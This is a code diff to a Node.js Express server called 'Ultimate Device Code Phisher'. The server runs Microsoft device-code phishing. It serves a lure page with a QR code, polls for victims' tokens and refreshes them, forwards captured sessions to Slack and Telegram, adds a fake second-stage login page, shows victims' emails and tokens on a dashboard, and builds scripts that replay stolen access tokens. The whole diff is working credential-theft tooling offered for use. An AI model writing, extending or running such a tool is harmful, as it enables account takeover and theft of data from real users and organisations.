@@ -1,10 +1,8 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v2.0 – All Features
+// 🥔 ULTIMATE DEVICE CODE PHISHER v2.2 – Static HTML files
 // ============================================================
-// Includes: Device Code, Auto‑Refresh, Multi‑Tenant, PRT,
-// Dashboard, Graph Email Exfil, IP Geolocation, Second‑Stage
-// Phishing, Multi‑Service, Replay, WebSocket, Health Check,
-// Multi‑Channel Exfil, Anti‑Bot, Custom Redirect, QR Code.
+// Now serves dashboard from public/index.html and device page
+// from public/device_code.html.
 // ============================================================
 
 const http = require('http');
@@ -175,11 +173,6 @@ async function exfiltrate(data) {
         } catch (e) { console.warn('Slack exfil failed:', e.message); }
     }
 
-    // SMTP (if configured)
-    if (SMTP_HOST && SMTP_USER && SMTP_PASS) {
-        // Not implemented for brevity – you can extend with nodemailer.
-    }
-
     console.log(`✅ Exfiltrated session ${sessionId}`);
 }
 
@@ -259,6 +252,9 @@ setInterval(refreshTokens, 60 * 60 * 1000); // every hour
 // ── Express App ──
 const app = express();
 app.use(express.json());
+
+// Serve static files from 'public' directory
+app.use(express.static('public'));
 
 // Health
 app.get(['/', '/health'], (req, res) => {
@@ -397,85 +393,6 @@ app.post('/device/token', async (req, res) => {
     }
 });
 
-// ── Device Page ──
-app.get('/device', async (req, res) => {
-    // Generate QR code for the verification URI
-    const qrData = `https://microsoft.com/devicelogin`;
-    const qrImage = await QRCode.toDataURL(qrData);
-    res.send(`
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Device Code</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { background: #0a0e17; color: #e0e8f0; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: rgba(255,255,255,0.05); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; padding: 40px; text-align: center; max-width: 500px; }
-        .code { font-size: 3rem; letter-spacing: 4px; background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin: 20px 0; font-weight: bold; }
-        .instructions { color: #a0b0c0; margin-bottom: 20px; }
-        .status { margin-top: 20px; font-size: 0.9rem; color: #80b0ff; }
-        .loader { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .qr { margin: 20px auto; max-width: 200px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>📱 Device Code</h1>
-        <p class="instructions">Enter this code on <strong>microsoft.com/devicelogin</strong> or scan the QR</p>
-        <div id="codeDisplay" class="code">Loading...</div>
-        <div class="qr"><img src="${qrImage}" alt="QR Code" style="width:100%;border-radius:8px;"></div>
-        <div id="status" class="status">⏳ Requesting device code...</div>
-    </div>
-    <script>
-        (async function() {
-            try {
-                const resp = await fetch('/device/request', { method: 'POST' });
-                const data = await resp.json();
-                document.getElementById('codeDisplay').textContent = data.user_code;
-                document.getElementById('status').innerHTML = '✅ Code ready – waiting for authentication... <span class="loader"></span>';
-
-                const poll = async () => {
-                    try {
-                        const pollResp = await fetch('/device/token', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ device_code: data.device_code })
-                        });
-                        if (pollResp.status === 200) {
-                            document.getElementById('status').innerHTML = '✅ Authentication successful! Redirecting...';
-                            setTimeout(() => {
-                                window.location.href = '${REDIRECT_URL}';
-                            }, 2000);
-                        } else if (pollResp.status === 400) {
-                            const err = await pollResp.json();
-                            if (err.error === 'authorization_pending') {
-                                setTimeout(poll, data.interval * 1000 || 5000);
-                            } else if (err.error === 'expired_token') {
-                                document.getElementById('status').innerHTML = '❌ Code expired. Please refresh the page.';
-                            } else {
-                                document.getElementById('status').innerHTML = '❌ Error: ' + (err.error_description || err.error);
-                            }
-                        } else {
-                            document.getElementById('status').innerHTML = '❌ Server error.';
-                        }
-                    } catch (e) {
-                        document.getElementById('status').innerHTML = '❌ Network error.';
-                    }
-                };
-                setTimeout(poll, data.interval * 1000 || 5000);
-            } catch (e) {
-                document.getElementById('codeDisplay').textContent = 'Error';
-                document.getElementById('status').innerHTML = '❌ Failed to get device code.';
-            }
-        })();
-    </script>
-</body>
-</html>
-    `);
-});
-
 // ── Second‑Stage Phishing (Fake Login) ──
 app.get('/login', (req, res) => {
     res.send(`
@@ -538,68 +455,7 @@ app.use('/dash', basicAuth({
     users: { [DASHBOARD_USER]: DASHBOARD_PASS },
     challenge: true
 }));
-app.get('/dash', (req, res) => {
-    res.send(`
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Phisher Dashboard</title>
-    <meta charset="UTF-8">
-    <style>
-        body { background: #0f1117; color: #e0e8f0; font-family: monospace; padding: 20px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
-        th { background: #1a1d24; }
-        .status-pending { color: orange; }
-        .status-approved { color: limegreen; }
-        #ws-status { color: #80b0ff; }
-    </style>
-</head>
-<body>
-    <h1>🕵️ Phisher Dashboard</h1>
-    <div id="ws-status">WebSocket: Connecting...</div>
-    <table id="flowsTable">
-        <thead><tr><th>Session</th><th>Email</th><th>Status</th><th>Created</th><th>Tokens</th></tr></thead>
-        <tbody id="flowsBody"></tbody>
-    </table>
-    <script>
-        const ws = new WebSocket('ws://' + window.location.host + '/ws');
-        ws.onopen = () => document.getElementById('ws-status').textContent = 'WebSocket: Connected';
-        ws.onclose = () => document.getElementById('ws-status').textContent = 'WebSocket: Disconnected';
-        ws.onmessage = (e) => {
-            const data = JSON.parse(e.data);
-            if (data.type === 'new_capture') {
-                addRow(data);
-            }
-        };
-
-        async function loadFlows() {
-            const resp = await fetch('/api/flows');
-            const flows = await resp.json();
-            const tbody = document.getElementById('flowsBody');
-            tbody.innerHTML = '';
-            flows.forEach(f => addRow(f));
-        }
-
-        function addRow(f) {
-            const tbody = document.getElementById('flowsBody');
-            const tr = document.createElement('tr');
-            tr.innerHTML = \`
-                <td>\${f.session_id}</td>
-                <td>\${f.username || 'Unknown'}</td>
-                <td class="status-\${f.status}">\${f.status}</td>
-                <td>\${new Date(f.created).toLocaleString()}</td>
-                <td>\${f.access_token ? '✅' : '❌'}</td>
-            \`;
-            tbody.prepend(tr);
-        }
-
-        loadFlows();
-    </script>
-</body>
-</html>
-    `);
-});
+// The dashboard is now served from public/index.html via static middleware
 
 // ── API endpoints for dashboard ──
 app.get('/api/flows', (req, res) => {
@@ -616,11 +472,8 @@ app.post('/api/replay/:sessionId', (req, res) => {
     const flow = flows.find(f => f.session_id === req.params.sessionId);
     if (!flow) return res.status(404).json({ error: 'not found' });
     // Build a replay script that injects stored cookies (if any)
-    // For now, return a simple script to set cookies from any stored header.
     const script = `
     (function() {
-        // You can inject cookies here if you stored them.
-        // Currently we only have tokens, not cookies.
         const token = '${flow.access_token || ''}';
         if (token) {
             localStorage.setItem('access_token', token);
@@ -676,7 +529,7 @@ server.on('upgrade', (req, socket, head) => {
 
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Ultimate Device Phisher running on port ${PORT}`);
-    console.log(`📱 Device page: http://localhost:${PORT}/device`);
+    console.log(`📱 Device page: http://localhost:${PORT}/device_code.html`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
     console.log(`🚀 All features loaded.`);
